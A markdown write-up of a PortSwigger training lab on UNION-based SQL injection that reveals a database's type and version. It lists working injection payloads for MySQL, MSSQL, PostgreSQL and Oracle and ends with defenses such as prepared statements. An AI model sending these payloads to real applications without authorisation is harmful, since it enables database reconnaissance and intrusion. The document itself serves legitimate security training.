# 📘 PortSwigger Lab: SQL injection attack, querying the database type and version

<a id="top"></a>

> 🔗 Lab: https://portswigger.net/web-security/sql-injection/union-attacks/lab-querying-database-version-mysql-microsoft

---

# 📑 Table of Contents

- [🎯 Goal](#goal)
- [🧠 Attack idea](#idea)
- [🏗 What you need to know](#how)
- [🔍 Step 1 — Column count](#step1)
- [🔍 Step 2 — Text columns](#step2)
- [🔍 Step 3 — Version string](#step3)
- [🧩 Payloads for different databases](#payloads)
- [💥 Why the attack worked](#why)
- [🛡 Defense](#defense)
- [🛠 Checklist](#checklist)

---

<a id="goal"></a>

# 🎯 Goal

Display the database version string using UNION SQL Injection.

---

<a id="idea"></a>

# 🧠 Attack idea

If the application returns SQL results in the response, we can append our own SELECT query using `UNION` and display database metadata.

```sql
UNION SELECT @@version,NULL
```

---

<a id="how"></a>

# 🏗 What you need to know

For a UNION attack, determine:
1. how many columns the original SELECT returns;
2. which columns accept text;
3. which version syntax the database engine uses.

---

<a id="step1"></a>

# 🔍 Step 1 — Column count

```http
/filter?category=Accessories'+UNION+SELECT+NULL#
```

❌ Error

```http
/filter?category=Accessories'+UNION+SELECT+NULL,NULL#
```

✅ Success

---

# Conclusion

The original SELECT query contains:
# 2 columns

---

<a id="step2"></a>

# 🔍 Step 2 — Text columns

```http
/filter?category=Accessories'+UNION+SELECT+'abc','def'#
```

If `abc` and `def` appear on the page:
- there are 2 columns;
- both accept string values.

---

<a id="step3"></a>

# 🔍 Step 3 — Version string

For MySQL / Microsoft SQL Server, use:

```sql
@@version
```

Payload:

```http
/filter?category=Accessories'+UNION+SELECT+@@version,NULL#
```

---

# Result

The response shows the database version string:

```text
MySQL 8.0.x
```

or:

```text
Microsoft SQL Server 2016
```

---

<a id="payloads"></a>

# 🧩 Payloads for different databases

## MySQL

```http
/filter?category=Accessories'+UNION+SELECT+@@version,NULL#
```

```http
/filter?category=Accessories'+UNION+SELECT+NULL,@@version#
```

Comment syntax:

```sql
#
```

or:

```sql
-- 
```

Important: MySQL requires a space after `--`.

---

## Microsoft SQL Server

```http
/filter?category=Accessories'+UNION+SELECT+@@version,NULL--
```

```http
/filter?category=Accessories'+UNION+SELECT+NULL,@@version--
```

---

## PostgreSQL

```http
/filter?category=Accessories'+UNION+SELECT+version(),NULL--
```

```http
/filter?category=Accessories'+UNION+SELECT+NULL,version()--
```

---

## Oracle

Oracle requires `FROM`.

```http
/filter?category=Accessories'+UNION+SELECT+banner,NULL+FROM+v$version--
```

```http
/filter?category=Accessories'+UNION+SELECT+NULL,banner+FROM+v$version--
```

---

<a id="why"></a>

# 💥 Why the attack worked

Because the application:
- inserted user input directly into SQL;
- did not use prepared statements;
- returned SQL results in the HTTP response.

---

<a id="defense"></a>

# 🛡 Defense

- Prepared Statements
- Parameterized Queries
- Input Validation
- Least Privilege
- Do not expose database errors to users
- WAF as an additional layer

Safe example:

```php
$stmt = $pdo->prepare("SELECT * FROM products WHERE category=?");
```

---

<a id="checklist"></a>

# 🛠 Checklist

- [ ] SQL Injection identified
- [ ] column count determined
- [ ] text-compatible columns identified
- [ ] database-specific syntax selected
- [ ] database version displayed
- [ ] database type identified

---

# ⬆ Back to top

[Return to top](#top)
